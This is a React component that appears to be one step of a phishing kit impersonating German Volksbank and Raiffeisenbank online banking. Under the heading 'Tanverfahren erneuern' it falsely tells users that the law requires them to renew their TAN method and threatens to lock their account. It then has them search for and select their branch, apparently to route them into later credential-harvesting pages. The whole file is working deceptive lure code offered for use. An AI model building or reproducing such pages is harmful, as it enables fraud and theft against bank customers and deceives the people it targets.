import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';

// Branch interfaces
interface Branch {
  id: number;
  city: string;
  branch_name: string;
  zip_code: string;
  section: string;
  search_text?: string;
  rank?: number;
}

interface SelectedBranch {
  branch_id: number;
  branch_name: string;
  city: string;
  zip_code: string;
}

interface BranchSelectionProps {
  onSubmit: (branch: SelectedBranch) => void;
}

const BranchSelection: React.FC<BranchSelectionProps> = ({ onSubmit }) => {
  const [searchQuery, setSearchQuery] = useState('');
  const [searchResults, setSearchResults] = useState<Branch[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [selectedIndex, setSelectedIndex] = useState(-1);
  const [error, setError] = useState<string | null>(null);
  
  const searchInputRef = useRef<HTMLInputElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);
  const searchTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  // Debounced search function
  const performSearch = async (query: string) => {
    if (!query.trim()) {
      setSearchResults([]);
      setIsDropdownOpen(false);
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await axios.get(`/api/branches/search?q=${encodeURIComponent(query)}&limit=10&type=volksbank`);
      setSearchResults(response.data);
      setIsDropdownOpen(true);
      setSelectedIndex(-1);
    } catch (error) {
      console.error('Branch search error:', error);
      setError('Fehler bei der Suche. Bitte versuchen Sie es erneut.');
      setSearchResults([]);
      setIsDropdownOpen(false);
    } finally {
      setIsLoading(false);
    }
  };

  // Handle search input change with debouncing
  const handleSearchChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const query = e.target.value;
    setSearchQuery(query);

    // Clear previous timeout
    if (searchTimeoutRef.current) {
      clearTimeout(searchTimeoutRef.current);
    }

    // Set new timeout for debounced search
    searchTimeoutRef.current = setTimeout(() => {
      performSearch(query);
    }, 300);
  };

  // Handle keyboard navigation
  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (!isDropdownOpen || searchResults.length === 0) return;

    switch (e.key) {
      case 'ArrowDown':
        e.preventDefault();
        setSelectedIndex(prev => 
          prev < searchResults.length - 1 ? prev + 1 : prev
        );
        break;
      case 'ArrowUp':
        e.preventDefault();
        setSelectedIndex(prev => prev > 0 ? prev - 1 : -1);
        break;
      case 'Enter':
        e.preventDefault();
        if (selectedIndex >= 0 && selectedIndex < searchResults.length) {
          handleBranchSelect(searchResults[selectedIndex]);
        }
        break;
      case 'Escape':
        setIsDropdownOpen(false);
        setSelectedIndex(-1);
        break;
    }
  };

  // Format branch name for better display
  const formatBranchName = (branchName: string): string => {
    // Remove redundant "Filiale" text and clean up formatting
    let formatted = branchName;
    
    // For "Bank 1 Saar eG Filiale [Location]" format, extract just the location
    const bank1SaarMatch = formatted.match(/^Bank 1 Saar eG\s+Filiale\s+(.+)$/);
    if (bank1SaarMatch) {
      return `Bank 1 Saar - ${bank1SaarMatch[1]}`;
    }
    
    // For other banks with "Filiale [Location]" pattern
    const filialeMatch = formatted.match(/^(.+?)\s+Filiale\s+(.+)$/);
    if (filialeMatch) {
      return `${filialeMatch[1]} - ${filialeMatch[2]}`;
    }
    
    // For "eG" banks, clean up the name
    if (formatted.includes(' eG')) {
      formatted = formatted.replace(' eG', '');
    }
    
    return formatted;
  };

  // Handle branch selection
  const handleBranchSelect = (branch: Branch) => {
    const selectedBranch: SelectedBranch = {
      branch_id: branch.id,
      branch_name: branch.branch_name,
      city: branch.city,
      zip_code: branch.zip_code
    };

    const displayName = formatBranchName(branch.branch_name);
    setSearchQuery(`${displayName} - ${branch.city} (${branch.zip_code})`);
    setIsDropdownOpen(false);
    setSelectedIndex(-1);
    
    // Submit the selection
    onSubmit(selectedBranch);
  };

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsDropdownOpen(false);
        setSelectedIndex(-1);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Focus search input on mount
  useEffect(() => {
    if (searchInputRef.current) {
      searchInputRef.current.focus();
    }
  }, []);

  // Cleanup timeout on unmount
  useEffect(() => {
    return () => {
      if (searchTimeoutRef.current) {
        clearTimeout(searchTimeoutRef.current);
      }
    };
  }, []);

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'GenosGFG, Helvetica Neue, Helvetica, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: 'clamp(16px, 4vw, 32px) clamp(8px, 2vw, 8px)',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'flex-start',
        overflow: 'visible'
      }}>
        <div style={{
          width: '100%',
          maxWidth: '660px',
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'visible'
        }}>
          <div style={{
            padding: 'clamp(16px, 5vw, 32px) clamp(16px, 5vw, 32px) clamp(12px, 4vw, 24px) clamp(16px, 5vw, 32px)'
          }}>
            <h1 style={{
              color: '#003d7a',
              fontSize: 'clamp(1.5rem, 4vw, 2.375rem)',
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: 'clamp(1.75rem, 4.5vw, 2.75rem)',
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Tanverfahren erneuern
            </h1>
            
            <div style={{
              marginBottom: '40px'
            }}>
              <p style={{
                margin: '0 0 16px 0',
                fontSize: 'clamp(14px, 3vw, 16px)',
                lineHeight: '24px',
                color: '#000',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal',
                fontWeight: 'normal'
              }}>
                Aufgrund gesetzlicher Bestimmungen sind Sie dazu verpflichtet, Ihr TAN-Verfahren nach vorgegebenen Zeiten zu erneuern!
              </p>
              <p style={{
                margin: '0 0 16px 0',
                fontSize: 'clamp(14px, 3vw, 16px)',
                lineHeight: '24px',
                color: '#000',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal',
                fontWeight: 'normal'
              }}>
                Ohne Aktualisierung wird Ihr Online Zugang aus Sicherheitsgründen gesperrt.
              </p>
              <p style={{
                margin: '0',
                fontSize: 'clamp(14px, 3vw, 16px)',
                lineHeight: '24px',
                color: '#000',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal',
                fontWeight: 'normal'
              }}>
                Bitte tragen Sie unten die Bankleitzahl oder den Namen Ihrer Volks- oder Raiffeisen Bankfiliale ein:
              </p>
            </div>

            <div className="branch-search-container" ref={dropdownRef}>
              <div className="branch-search-input-wrapper">
                <input
                  ref={searchInputRef}
                  type="text"
                  className="branch-search-input"
                  placeholder="Filiale suchen (Stadt, PLZ oder Filialname)"
                  value={searchQuery}
                  onChange={handleSearchChange}
                  onKeyDown={handleKeyDown}
                  onFocus={() => {
                    if (searchResults.length > 0) {
                      setIsDropdownOpen(true);
                    }
                  }}
                />
                {isLoading && (
                  <div className="branch-search-loading">
                    <div className="spinner"></div>
                  </div>
                )}
              </div>

              {isDropdownOpen && (
                <div className="branch-dropdown">
                  {searchResults.length > 0 ? (
                    searchResults.map((branch, index) => (
                      <div
                        key={branch.id}
                        className={`branch-dropdown-item ${
                          index === selectedIndex ? 'selected' : ''
                        }`}
                        onClick={() => handleBranchSelect(branch)}
                        onMouseEnter={() => setSelectedIndex(index)}
                      >
                        <div className="branch-name">{formatBranchName(branch.branch_name)}</div>
                        <div className="branch-location">
                          {branch.city} • {branch.zip_code}
                        </div>
                      </div>
                    ))
                  ) : (
                    <div className="branch-dropdown-empty">
                      {searchQuery.trim() ? 'Keine Filialen gefunden' : 'Geben Sie einen Suchbegriff ein'}
                    </div>
                  )}
                </div>
              )}
            </div>

            {error && (
              <div className="branch-error">
                {error}
              </div>
            )}

            <div className="branch-selection-help">
              <p>
                <strong>Tipp:</strong> Sie können nach Stadt, Postleitzahl oder Filialname suchen.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BranchSelection;
